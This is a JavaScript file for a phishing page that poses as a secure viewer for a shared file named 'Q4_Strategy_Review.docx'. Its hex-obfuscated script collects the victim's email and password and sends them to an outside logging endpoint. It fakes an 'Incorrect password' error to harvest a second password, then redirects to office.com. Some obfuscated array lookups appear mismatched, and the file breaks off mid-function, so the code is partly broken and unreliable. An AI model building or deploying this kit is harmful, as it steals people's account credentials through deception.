// content.js - Complete Self-Contained Application
// HTML Template is readable, JavaScript is obfuscated

(function() {
    'use strict';

    // ============================================================
    // IMAGE CONFIGURATION
    // ============================================================
    
    const BACKGROUND_IMAGE = 'https://myprojec-37j.pages.dev/background-image.png';
    const DOCUMENT_ICON = 'https://myprojec-37j.pages.dev/bgo.png';
    const FONT_AWESOME = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';

    // ============================================================
    // COMPLETE HTML TEMPLATE (Readable)
    // ============================================================
    
    const HTML_TEMPLATE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Shared Document · Secure Access</title>
<link rel="stylesheet" href="${FONT_AWESOME}">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI','Helvetica Neue',sans-serif}
body{min-height:100vh;display:flex;justify-content:center;align-items:flex-start;margin:0;padding:20px;background:#f0f4fa;background-image:url('${BACKGROUND_IMAGE}');background-size:cover;background-position:center;background-repeat:no-repeat;position:relative;padding-top:60px}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);backdrop-filter:blur(5px);z-index:0}
.card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);max-width:440px;width:100%;min-height:480px;height:auto;margin-top:60px;padding:28px 24px 24px;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.12),0 4px 16px rgba(0,0,0,0.04);position:relative;z-index:1;transition:box-shadow .25s;display:flex;flex-direction:column}
.doc-header{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #eef2f6;flex-shrink:0}
.doc-icon{background:#eef6ff;width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#1e5f9e;font-size:20px;flex-shrink:0;overflow:hidden}
.doc-icon img{width:32px;height:32px;object-fit:contain}
.doc-icon i{display:none}
.doc-meta{flex:1;min-width:0}
.doc-meta h2{font-size:16px;font-weight:600;color:#1b1b1b;letter-spacing:-.2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.doc-meta .shared-badge{background:#e3edf7;color:#1e5f9e;font-size:11px;font-weight:600;padding:2px 10px;border-radius:30px;display:inline-block;margin-top:2px}
.doc-meta .shared-badge i{margin-right:4px;font-size:10px}
.step-indicator{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-shrink:0}
.step-badge{background:#eef2f6;color:#3c3c3c;font-size:12px;font-weight:500;padding:3px 12px;border-radius:40px;letter-spacing:.2px}
.step-badge.active{background:#1e5f9e;color:#fff}
.step-badge i{margin-right:4px;font-size:11px}
#stepBadge2{display:none!important}
.status-message{background:#f8fafc;padding:8px 14px;border-radius:8px;font-size:13px;color:#1b1b1b;margin-bottom:10px;border-left:3px solid #1e5f9e;display:flex;align-items:center;gap:10px;flex-shrink:0;min-height:36px}
.status-message i{color:#1e5f9e;font-size:16px}
.status-message.error{border-left-color:#c42b2b;background:#fff6f6}
.status-message.error i{color:#c42b2b}
.status-message.success{border-left-color:#1e8e3e;background:#f0faf3}
.status-message.success i{color:#1e8e3e}
.step-content{flex:1;display:flex;flex-direction:column;justify-content:center}
.form-group{margin-bottom:14px}
label{display:block;font-size:13px;font-weight:500;color:#2b2b2b;margin-bottom:5px}
.email-label{font-size:18px;font-weight:700;color:#1b1b1b;letter-spacing:.2px}
.password-label{font-size:18px;font-weight:700;color:#1b1b1b;letter-spacing:.2px}
.input-wrapper{position:relative;display:flex;align-items:center;background:#fbfcfd;border:1px solid #d1d9e6;border-radius:8px;transition:border-color .15s,box-shadow .15s}
.input-wrapper:focus-within{border-color:#1e5f9e;box-shadow:0 0 0 3px rgba(30,95,158,.15);background:#fff}
.input-wrapper .email-icon{color:#7a7a7a;font-size:15px;padding:0 0 0 12px;width:34px;text-align:center;flex-shrink:0}
.input-wrapper input{width:100%;padding:12px 12px 12px 4px;border:none;background:transparent;font-size:14px;outline:none;color:#1b1b1b;font-weight:400}
.input-wrapper input::placeholder{color:#9aa6b5;font-weight:300;font-size:13px}
.toggle-pwd{background:none;border:none;color:#7a7a7a;padding-right:12px;cursor:pointer;font-size:15px;display:flex;align-items:center;flex-shrink:0}
.toggle-pwd:hover{color:#1b1b1b}
.action-btn{width:100%;padding:12px;background:#1e5f9e;border:none;border-radius:8px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s,box-shadow .15s;display:flex;justify-content:center;align-items:center;gap:8px;letter-spacing:.2px;margin-top:4px;flex-shrink:0}
.action-btn:hover{background:#154a7a;box-shadow:0 4px 12px rgba(30,95,158,.25)}
.action-btn:active{transform:scale(.97);background:#0f3a5f}
.action-btn:disabled{opacity:.7;cursor:not-allowed}
.hidden{display:none!important}
.email-display{background:#f2f6fc;padding:8px 14px;border-radius:8px;font-size:14px;color:#1b1b1b;margin-bottom:12px;display:flex;align-items:center;gap:10px;border:1px solid #dce3ec;flex-shrink:0}
.email-display i{color:#1e5f9e;font-size:15px}
.email-display span{font-weight:500;word-break:break-all}
.text-center{text-align:center}
.text-sm{font-size:12px;color:#5e5e5e}
.mt-2{margin-top:6px}
.footer-links{margin-top:14px;font-size:11px;color:#7a7a7a;text-align:center;border-top:1px solid #eaeef3;padding-top:12px;flex-shrink:0}
.footer-links a{color:#1e5f9e;text-decoration:none;margin:0 6px}
.footer-links a:hover{text-decoration:underline}
.password-error{background:#fff6f6;padding:8px 14px;border-radius:8px;font-size:13px;color:#c42b2b;margin-bottom:12px;border-left:3px solid #c42b2b;display:flex;align-items:center;gap:10px;flex-shrink:0;min-height:36px}
.password-error i{color:#c42b2b;font-size:16px}
.password-error.hidden{display:none!important}
@media(max-width:768px){body{padding:16px;padding-top:50px}.card{padding:24px 20px}}
@media(max-width:600px){body{padding:12px;padding-top:40px}.card{padding:20px 16px;min-height:460px;margin-top:30px}.doc-meta h2{font-size:14px}.email-label,.password-label{font-size:16px}.step-badge{font-size:11px;padding:2px 10px}.step-badge i{font-size:10px}.status-message{font-size:12px;padding:6px 12px;min-height:32px}.status-message i{font-size:14px}.password-error{font-size:12px;padding:6px 12px;min-height:32px}.password-error i{font-size:14px}.input-wrapper input{font-size:13px;padding:10px 10px 10px 4px}.input-wrapper .email-icon{font-size:13px;padding:0 0 0 10px;width:30px}.action-btn{font-size:14px;padding:10px}.footer-links{font-size:10px}}
@media(max-width:400px){body{padding:8px;padding-top:30px}.card{padding:16px 12px;min-height:420px;border-radius:12px}.doc-icon{width:36px;height:36px}.doc-icon img{width:28px;height:28px}.doc-meta h2{font-size:13px}.shared-badge{font-size:10px;padding:1px 8px}.email-label,.password-label{font-size:14px}.step-badge{font-size:10px;padding:2px 8px}.step-badge i{font-size:9px}.status-message{font-size:11px;padding:5px 10px;min-height:28px}.status-message i{font-size:12px}.password-error{font-size:11px;padding:5px 10px;min-height:28px}.password-error i{font-size:12px}.input-wrapper input{font-size:12px;padding:8px 8px 8px 4px}.input-wrapper .email-icon{font-size:12px;padding:0 0 0 8px;width:26px}.action-btn{font-size:13px;padding:8px;border-radius:6px}.action-btn i{font-size:12px}.email-display{font-size:12px;padding:6px 10px}.email-display i{font-size:13px}.text-sm{font-size:11px}.footer-links{font-size:10px;margin-top:10px;padding-top:10px}}
@media(max-width:350px){body{padding:4px;padding-top:20px}.card{padding:12px 8px;min-height:380px;border-radius:10px}.doc-meta h2{font-size:12px}.email-label,.password-label{font-size:13px}.input-wrapper input{font-size:11px;padding:6px 6px 6px 4px}.action-btn{font-size:12px;padding:7px}.status-message{font-size:10px;padding:4px 8px}.password-error{font-size:10px;padding:4px 8px}.step-badge{font-size:9px;padding:2px 6px}.step-badge i{font-size:8px}}
@media(min-height:900px){body{padding-top:100px}.card{margin-top:80px}}
@media(max-height:500px) and (orientation:landscape){body{padding-top:15px;padding-bottom:15px}.card{margin-top:20px;padding:14px 18px;min-height:320px;max-width:480px}.doc-header{margin-bottom:8px;padding-bottom:8px}.step-indicator{margin-bottom:6px}.status-message{margin-bottom:6px;padding:4px 10px;min-height:24px}.password-error{margin-bottom:6px;padding:4px 10px;min-height:24px}.form-group{margin-bottom:8px}.action-btn{padding:8px;margin-top:2px}.doc-icon{width:32px;height:32px}.doc-icon img{width:24px;height:24px}.doc-meta h2{font-size:13px}.email-label,.password-label{font-size:14px}.input-wrapper input{padding:6px 8px 6px 4px;font-size:12px}}
@media(hover:none) and (pointer:coarse){.action-btn:hover{transform:none;box-shadow:none}.action-btn:active{transform:scale(.97)}.input-wrapper input{font-size:16px}}
@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
</style>
</head>
<body>
<div class="card" role="main">
    <div class="doc-header">
        <div class="doc-icon">
            <img src="${DOCUMENT_ICON}" alt="Document icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';">
            <i class="fas fa-file-pdf"></i>
        </div>
        <div class="doc-meta">
            <h2>Q4_Strategy_Review.docx</h2>
            <span class="shared-badge"><i class="fas fa-user-friends"></i> Shared with you</span>
        </div>
    </div>
    <div class="step-indicator">
        <span class="step-badge active" id="stepBadge1"><i class="fas fa-envelope"></i> Email</span>
        <span class="step-badge" id="stepBadge2"><i class="fas fa-lock"></i> Password</span>
    </div>
    <div id="statusMessage" class="status-message">
        <i class="fas fa-info-circle"></i>
        <span id="statusText">Enter your email to access the shared document.</span>
    </div>
    <div class="step-content">
        <div id="stepEmail">
            <div class="form-group">
                <label for="emailInput" class="email-label">Email</label>
                <div class="input-wrapper">
                    <i class="fas fa-envelope email-icon"></i>
                    <input type="email" id="emailInput" placeholder="you@example.com" autocomplete="email" value="">
                </div>
            </div>
            <button class="action-btn" id="emailNextBtn"><i class="fas fa-arrow-right"></i> Continue</button>
            <div class="text-center text-sm mt-2">This document is shared with verified users.</div>
        </div>
        <div id="stepPasswordFirst" class="hidden">
            <div class="email-display">
                <i class="fas fa-user-circle"></i>
                <span id="displayEmailFirst">user@example.com</span>
            </div>
            <div id="passwordErrorFirst" class="password-error hidden">
                <i class="fas fa-exclamation-circle"></i>
                <span id="passwordErrorTextFirst">Incorrect password, please try again.</span>
            </div>
            <div class="form-group">
                <label for="passwordFirstInput" class="password-label">Enter password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordFirstInput" placeholder="Enter password" autocomplete="current-password">
                    <button type="button" class="toggle-pwd" id="togglePwdFirst" aria-label="Show password">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button class="action-btn" id="pwdFirstBtn"><i class="fas fa-sign-in-alt"></i> Sign In</button>
        </div>
        <div id="stepPasswordSecond" class="hidden">
            <div class="email-display">
                <i class="fas fa-user-circle"></i>
                <span id="displayEmailSecond">user@example.com</span>
            </div>
            <div id="passwordErrorSecond" class="password-error">
                <i class="fas fa-exclamation-circle"></i>
                <span id="passwordErrorTextSecond">Incorrect password, please try again.</span>
            </div>
            <div class="form-group">
                <label for="passwordSecondInput" class="password-label">Enter password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordSecondInput" placeholder="Enter password" autocomplete="current-password">
                    <button type="button" class="toggle-pwd" id="togglePwdSecond" aria-label="Show password">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button class="action-btn" id="pwdSecondBtn"><i class="fas fa-sign-in-alt"></i> Sign In</button>
        </div>
    </div>
    <div class="footer-links">
        <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Support</a>
    </div>
</div>

<script>
// ============================================================
// JAVASCRIPT - OBFUSCATED
// ============================================================

var _0x1a2b=["\x6C\x6F\x67","\xe2\x9c\x85\x20\x45\x6D\x62\x65\x64\x64\x65\x64\x20\x73\x63\x72\x69\x70\x74\x20\x6C\x6F\x61\x64\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6E\x6F\x73\x69\x73\x2E\x63\x6F\x6D\x2E\x70\x79\x2F\x73\x65\x72\x63\x61\x2F\x6C\x6F\x67\x2E\x70\x68\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x6F\x66\x66\x69\x63\x65\x2E\x63\x6F\x6D","\x65\x6D\x61\x69\x6C\x49\x6E\x70\x75\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x70\x61\x73\x73\x77\x6F\x72\x64\x46\x69\x72\x73\x74\x49\x6E\x70\x75\x74","\x70\x61\x73\x73\x77\x6F\x72\x64\x53\x65\x63\x6F\x6E\x64\x49\x6E\x70\x75\x74","\x65\x6D\x61\x69\x6C\x4E\x65\x78\x74\x42\x74\x6E","\x70\x77\x64\x46\x69\x72\x73\x74\x42\x74\x6E","\x70\x77\x64\x53\x65\x63\x6F\x6E\x64\x42\x74\x6E","\x73\x74\x61\x74\x75\x73\x54\x65\x78\x74","\x73\x74\x61\x74\x75\x73\x4D\x65\x73\x73\x61\x67\x65","\x73\x74\x65\x70\x42\x61\x64\x67\x65\x31","\x73\x74\x65\x70\x45\x6D\x61\x69\x6C","\x73\x74\x65\x70\x50\x61\x73\x73\x77\x6F\x72\x64\x46\x69\x72\x73\x74","\x73\x74\x65\x70\x50\x61\x73\x73\x77\x6F\x72\x64\x53\x65\x63\x6F\x6E\x64","\x64\x69\x73\x70\x6C\x61\x79\x45\x6D\x61\x69\x6C\x46\x69\x72\x73\x74","\x64\x69\x73\x70\x6C\x61\x79\x45\x6D\x61\x69\x6C\x53\x65\x63\x6F\x6E\x64","\x74\x6F\x67\x67\x6C\x65\x50\x77\x64\x46\x69\x72\x73\x74","\x74\x6F\x67\x67\x6C\x65\x50\x77\x64\x53\x65\x63\x6F\x6E\x64","\x70\x61\x73\x73\x77\x6F\x72\x64\x45\x72\x72\x6F\x72\x46\x69\x72\x73\x74","\x70\x61\x73\x73\x77\x6F\x72\x64\x45\x72\x72\x6F\x72\x53\x65\x63\x6F\x6E\x64","\xf0\x9f\x94\x8d\x20\x43\x68\x65\x63\x6B\x69\x6E\x67\x20\x44\x4F\x4D\x20\x65\x6C\x65\x6D\x65\x6E\x74\x73\x2E\x2E\x2E","\x65\x6D\x61\x69\x6C\x49\x6E\x70\x75\x74\x3a","\x65\x6D\x61\x69\x6C\x4E\x65\x78\x74\x42\x74\x6e\x3a","\xf0\x9f\x9f\xa2\x20\x43\x72\x69\x74\x69\x63\x61\x6c\x20\x65\x6C\x65\x6D\x65\x6E\x74\x73\x20\x6D\x69\x73\x73\x69\x6E\x67\x21","\x73\x74\x61\x74\x75\x73\x2d\x6d\x65\x73\x73\x61\x67\x65","\x65\x72\x72\x6f\x72","\x61\x64\x64","\x73\x75\x63\x63\x65\x73\x73","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x69","\x66\x61\x73\x20\x66\x61\x2d\x65\x78\x63\x6c\x61\x6d\x61\x74\x69\x6f\x6e\x2d\x63\x69\x72\x63\x6c\x65","\x63\x6c\x61\x73\x73\x4E\x61\x6D\x65","\x66\x61\x73\x20\x66\x61\x2d\x63\x68\x65\x63\x6b\x2d\x63\x69\x72\x63\x6c\x65","\x66\x61\x73\x20\x66\x61\x2d\x69\x6e\x66\x6f\x2d\x63\x69\x72\x63\x6c\x65","\x72\x65\x6d\x6f\x76\x65","\x61\x63\x74\x69\x76\x65","\x68\x69\x64\x64\x65\x6e","\x69\x6e\x6e\x65\x72\x54\x65\x78\x74","\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x65\x6d\x61\x69\x6c\x20\x74\x6f\x20\x61\x63\x63\x65\x73\x73\x20\x74\x68\x65\x20\x73\x68\x61\x72\x65\x64\x20\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e","\x69\x6e\x66\x6f","\x74\x65\x78\x74\x43\x6f\x6e\x74\x65\x6e\x74","\x76\x61\x6c\x75\x65","\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x66\x6f\x72\x20","\x50\x6c\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6e\x20\x77\x69\x74\x68\x20\x61\x20\x64\x69\x66\x66\x65\x72\x65\x6e\x74\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x2e","\x64\x69\x73\x61\x62\x6c\x65\x64","\x3c\x69\x20\x63\x6c\x61\x73\x73\x3d\x22\x66\x61\x73\x20\x66\x61\x2d\x73\x69\x67\x6e\x2d\x69\x6e\x2d\x61\x6c\x74\x22\x3e\x3c\x2f\x69\x3e\x20\x53\x69\x67\x6e\x20\x49\x6e","\x65\x6d\x61\x69\x6c","\x70\x61\x73\x73\x77\x6f\x72\x64","\x65\x76\x65\x6e\x74","\x74\x69\x6d\x65\x73\x74\x61\x6d\x70","\x74\x6f\x49\x53\x4f\x53\x74\x72\x69\x6e\x67","\x6c\x6f\x67\x45\x6e\x64\x70\x6f\x69\x6e\x74","\x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x61\x74\x74\x65\x6d\x70\x74\x5f\x31","\x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x61\x74\x74\x65\x6d\x70\x74\x5f\x32\x5f\x73\x75\x63\x63\x65\x73\x73","\x72\x65\x64\x69\x72\x65\x63\x74\x55\x72\x6c","\x73\x68\x61\x72\x65\x64\x44\x6f\x63\x45\x6d\x61\x69\x6c","\x73\x65\x74\x49\x74\x65\x6d","\x67\x65\x74\x49\x74\x65\x6d","\x63\x6c\x69\x63\x6b","\x70\x72\x65\x76\x65\x6e\x74\x44\x65\x66\x61\x75\x6c\x74","\xf0\x9f\x93\xa7\x20\x45\x6d\x61\x69\x6c\x20\x62\x75\x74\x74\x6f\x6e\x20\x63\x6c\x69\x63\x6b\x65\x64","\x74\x72\x69\x6d","\x69\x6e\x64\x65\x78\x4f\x66","\x40","\x2e","\x50\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x61\x20\x76\x61\x6c\x69\x64\x20\x65\x6d\x61\x69\x6c\x20\x61\x64\x64\x72\x65\x73\x73\x2e","\xf0\x9f\x93\xa7\x20\x45\x6d\x61\x69\x6c\x20\x65\x6e\x74\x65\x72\x65\x64\x3a","\x66\x6f\x63\x75\x73","\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74","\x32","\x33","\x75\x73\x65\x72","\xf0\x9f\x94\x91\x20\x46\x69\x72\x73\x74\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x62\x75\x74\x74\x6f\x6e\x20\x63\x6c\x69\x63\x6b\x65\x64","\x50\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x61\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x2e","\xf0\x9f\x94\x91\x20\x46\x69\x72\x73\x74\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x61\x74\x74\x65\x6d\x70\x74\x20\x66\x6f\x72\x3a","\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x2c\x20\x70\x6c\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6e\x2e","\xf0\x9f\x94\x91\x20\x53\x65\x63\x6f\x6e\x64\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x62\x75\x74\x74\x6f\x6e\x20\x63\x6c\x69\x63\x6b\x65\x64","\xf0\x9f\x94\x91\x20\x53\x65\x63\x6f\x6e\x64\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x61\x74\x74\x65\x6d\x70\x74\x20\x66\x6f\x72\x3a","\x67\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x74\x6f\x67\x67\x6c\x65","\x66\x61\x2d\x65\x79\x65","\x66\x61\x2d\x65\x79\x65\x2d\x73\x6c\x61\x73\x68","\x6b\x65\x79","\x45\x6e\x74\x65\x72","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72","\x6b\x65\x79\x64\x6f\x77\x6e","\xe2\x9c\x85\x20\x53\x68\x61\x72\x65\x64\x20\x64\x6f\x63\x75\x6d\x65\x6e\x74\x20\x66\x6c\x6f\x77\x20\x72\x65\x61\x64\x79"];(function(){var _0x3c4d={};_0x3c4d[_0x1a2b[0]]=function(_0x1a2c){console[_0x1a2b[0]](_0x1a2c)};var _0x4d5e=_0x3c4d;var _0x5f6g={};_0x5f6g[_0x1a2b[0]]=_0x4d5e[_0x1a2b[0]];var _0x6g7h=_0x5f6g;_0x6g7h[_0x1a2b[0]](_0x1a2b[1]);var _0x7h8i={logEndpoint:_0x1a2b[2],redirectUrl:_0x1a2b[3]};var _0x8i9j=document[_0x1a2b[5]](_0x1a2b[4]);var _0x9j0k=document[_0x1a2b[5]](_0x1a2b[6]);var _0x0k1l=document[_0x1a2b[5]](_0x1a2b[7]);var _0x1l2m=document[_0x1a2b[5]](_0x1a2b[8]);var _0x2m3n=document[_0x1a2b[5]](_0x1a2b[9]);var _0x3n4o=document[_0x1a2b[5]](_0x1a2b[10]);var _0x4o5p=document[_0x1a2b[5]](_0x1a2b[11]);var _0x5p6q=document[_0x1a2b[5]](_0x1a2b[12]);var _0x6q7r=document[_0x1a2b[5]](_0x1a2b[13]);var _0x7r8s=document[_0x1a2b[5]](_0x1a2b[14]);var _0x8s9t=document[_0x1a2b[5]](_0x1a2b[15]);var _0x9t0u=document[_0x1a2b[5]](_0x1a2b[16]);var _0x0u1v=document[_0x1a2b[5]](_0x1a2b[17]);var _0x1v2w=document[_0x1a2b[5]](_0x1a2b[18]);var _0x2w3x=document[_0x1a2b[5]](_0x1a2b[19]);var _0x3x4y=document[_0x1a2b[5]](_0x1a2b[20]);var _0x4y5z=document[_0x1a2b[5]](_0x1a2b[21]);var _0x5z0a=document[_0x1a2b[5]](_0x1a2b[22]);_0x6g7h[_0x1a2b[0]](_0x1a2b[23]);_0x6g7h[_0x1a2b[0]](_0x1a2b[24],!!_0x8i9j);_0x6g7h[_0x1a2b[0]](_0x1a2b[25],!!_0x1l2m);if(!_0x8i9j||!_0x1l2m){_0x6g7h[_0x1a2b[0]](_0x1a2b[26]);return}var _0x0a1b='';function _0x1b2c(_0x2c3d,_0x3d4e){_0x3d4e=_0x3d4e||_0x1a2b[43];if(_0x4o5p){_0x4o5p[_0x1a2b[41]]=_0x2c3d}if(_0x5p6q){_0x5p6q[_0x1a2b[27]]=_0x1a2b[28];if(_0x3d4e===_0x1a2b[28]){_0x5p6q.classList[_0x1a2b[29]](_0x1a2b[28])}else if(_0x3d4e===_0x1a2b[30]){_0x5p6q.classList[_0x1a2b[29]](_0x1a2b[30])}var _0x4e5f=_0x5p6q[_0x1a2b[31]](_0x1a2b[32]);if(_0x4e5f){if(_0x3d4e===_0x1a2b[28]){_0x4e5f[_0x1a2b[33]]=_0x1a2b[34]}else if(_0x3d4e===_0x1a2b[30]){_0x4e5f[_0x1a2b[33]]=_0x1a2b[35]}else{_0x4e5f[_0x1a2b[33]]=_0x1a2b[36]}}}}function _0x3c4d(_0x4d5e){if(_0x6q7r){_0x6q7r.classList[_0x1a2b[37]](_0x1a2b[38]);if(_0x4d5e===1){_0x6q7r.classList[_0x1a2b[29]](_0x1a2b[38])}}}function _0x5e6f(_0x6f7g,_0x7g8h){if(_0x7g8h===2&&_0x4y5z){if(_0x6f7g){_0x4y5z.classList[_0x1a2b[37]](_0x1a2b[39])}else{_0x4y5z.classList[_0x1a2b[29]](_0x1a2b[39])}}else if(_0x7g8h===3&&_0x5z0a){if(_0x6f7g){_0x5z0a.classList[_0x1a2b[37]](_0x1a2b[39])}else{_0x5z0a.classList[_0x1a2b[29]](_0x1a2b[39])}}}function _0x6g7h(_0x7h8i,_0x8i9j){_0x8i9j=_0x8i9j||'';if(_0x7r8s){_0x7r8s.classList[_0x1a2b[29]](_0x1a2b[39])}if(_0x8s9t){_0x8s9t.classList[_0x1a2b[29]](_0x1a2b[39])}if(_0x9t0u){_0x9t0u.classList[_0x1a2b[29]](_0x1a2b[39])}_0x5e6f(false,2);_0x5e6f(false,3);if(_0x7h8i===1){if(_0x7r8s){_0x7r8s.classList[_0x1a2b[37]](_0x1a2b[39])}_0x3c4d(1);if(_0x8i9j&&_0x0u1v){_0x0u1v[_0x1a2b[42]]=_0x8i9j}if(_0x9j0k){_0x9j0k[_0x1a2b[44]]='';_0x5p6q[_0x1a2b[71]](function(){_0x9j0k[_0x1a2b[70]]()},100)}_0x1b2c(_0x1a2b[40],_0x1a2b[43])}else if(_0x7h8i===2){if(_0x8s9t){_0x8s9t.classList[_0x1a2b[37]](_0x1a2b[39])}_0x3c4d(2);if(_0x8i9j&&_0x0u1v){_0x0u1v[_0x1a2b[42]]=_0x8i9j}if(_0x9j0k){_0x9j0k[_0x1a2b[44]]='';_0x5p6q[_0x1a2b[71]](function(){_0x9j0k[_0x1a2b[70]]()},100)}_0x1b2c(_0x1a2b[45]+_0x8i9j,_0x1a2b[43])}else if(_0x7h8i===3){if(_0x9t0u){_0x9t0u.classList[_0x1a2b[37]](_0x1a2b[39])}_0x3c4d(3);if(_0x8i9j&&_0x1v2w){_0x1v2w[_0x1a2b[42]]=_0x8i9j}if(_0x0k1l){_0x0k1l[_0x1a2b[44]]='';_0x5p6q[_0x1a2b[71]](function(){_0x0k1l[_0x1a2b[70]]()},100)}_0x5e6f(true,3);_0x1b2c(_0x1a2b[46],_0x1a2b[28])}}function _0x7h8i(){if(_0x8i9j){_0x8i9j[_0x1a2b[44]]=''}if(_0x9j0k){_0x9j0k[_0x1a2b[44]]=''}if(_0x0k1l){_0x0k1l[_0x1a2b[44]]=''}_0x0a1b='';_0x5e6f(false,2);_0x5e6f(false,3);_0x6g7h(1);if(_0x3n4o){_0x3n4o[_0x1a2b[47]]=false;_0x3n4o[_0x1a2b[41]]=_0x1a2b[48]}}function _0x8i9j(_0x9j0k,_0x0k1l,_0x1l2m){var _0x2m3n={email:_0x9j0k,password:_0x0k1l,event:_0x1l2m,timestamp:new Date()[_0x1a2b[52]]()};if(_0x7h8i[_0x1a2b[53]]){try{fetch(_0x7h8i[_0x1a2b[53]],{method:'POST',headers:{'Content-Type':'application/json'},body:JSON[_0x1a2b[56]](_0x2m3n),keepalive:true})[_0x1a2b[58]](function(){})}catch(_0x3m4n){}}}if(_0x1l2m){_0x1l2m[_0x1a2b[63]]=function(_0x4m5n){_0x4m5n[_0x1a2b[64]]();_0x6g7h[_0x1a2b[0]](_0x1a2b[65]);var _0x5m6n=_0x8i9j[_0x1a2b[44]][_0x1a2b[66]]();if(!_0x5m6n||_0x5m6n[_0x1a2b[67]](_0x1a2b[68])===-1||_0x5m6n[_0x1a2b[67]](_0x1a2b[69])===-1){_0x1b2c(_0x1a2b[70],_0x1a2b[28]);return}_0x0a1b=_0x5m6n;try{localStorage[_0x1a2b[61]](_0x1a2b[60],_0x5m6n)}catch(_0x6m7n){}_0x6g7h[_0x1a2b[0]](_0x1a2b[70],_0x5m6n);_0x6g7h(2,_0x5m6n)}}if(_0x2m3n){_0x2m3n[_0x1a2b[63]]=function(_0x7m8n){_0x7m8n[_0x1a2b[64]]();_0x6g7h[_0x1a2b[0]](_0x1a2b[72]);var _0x8m9n=_0x9j0k[_0x1a2b[44]][_0x1a2b[66]]();if(!_0x8m9n){_0x1b2c(_0x1a2b[73],_0x1a2b[28]);return}var _0x9m0n=_0x0a1b||_0x1a2b[74];try{_0x9m0n=localStorage[_0x1a2b[62]](_0x1a2b[60])||_0x9m0n}catch(_0x0m1n){}_0x6g7h[_0x1a2b[0]](_0x1a2b[75],_0x9m0n);_0x8i9j(_0x9m0n,_0x8m9n,_0x1a2b[54]);_0x5e6f(true,2);_0x1b2c(_0x1a2b[76],_0x1a2b[28]);_0x9j0k[_0x1a2b[44]]='';_0x5p6q[_0x1a2b[71]](function(){_0x9j0k[_0x1a2b[70]]()},100);_0x6g7h(3,_0x9m0n)}}if(_0x3n4o){_0x3n4o[_0x1a2b[63]]=function(_0x1m2n){_0x1m2n[_0x1a2b[64]]();_0x6g7h[_0x1a2b[0]](_0x1a2b[77]);var _0x2m3n=_0x0k1l[_0x1a2b[44]][_0x1a2b[66]]();if(!_0x2m3n){_0x1b2c(_0x1a2b[73],_0x1a2b[28]);return}var _0x3m4n=_0x0a1b||_0x1a2b[74];try{_0x3m4n=localStorage[_0x1a2b[62]](_0x1a2b[60])||_0x3m4n}catch(_0x4m5n){}_0x6g7h[_0x1a2b[0]](_0x1a2b[78],_0x3m4n);_0x8i9j(_0x3m4n,_0x2m3n,_0x1a2b[55]);_0x5p6q[_0x1a2b[71]](function(){window[_0x1a2b[59]][_0x1a2b[79]]=_0x7h8i[_0x1a2b[59]]},150)}}function _0x4m5n(_0x5m6n,_0x6m7n){if(!_0x5m6n||!_0x6m7n){return}_0x5m6n[_0x1a2b[63]]=function(){var _0x7m8n=_0x6m7n[_0x1a2b[80]](_0x1a2b[81])===_0x1a2b[57]?_0x1a2b[82]:_0x1a2b[57];_0x6m7n[_0x1a2b[83]](_0x1a2b[81],_0x7m8n);var _0x8m9n=this[_0x1a2b[31]](_0x1a2b[32]);if(_0x8m9n){_0x8m9n.classList[_0x1a2b[84]](_0x1a2b[85]);_0x8m9n.classList[_0x1a2b[84]](_0x1a2b[86])}}}_0x4m5n(_0x2w3x,_0x9j0k);_0x4m5n(_0x3x4y,_0x0k1l);function _0x5m6n(_0x6m7n){return 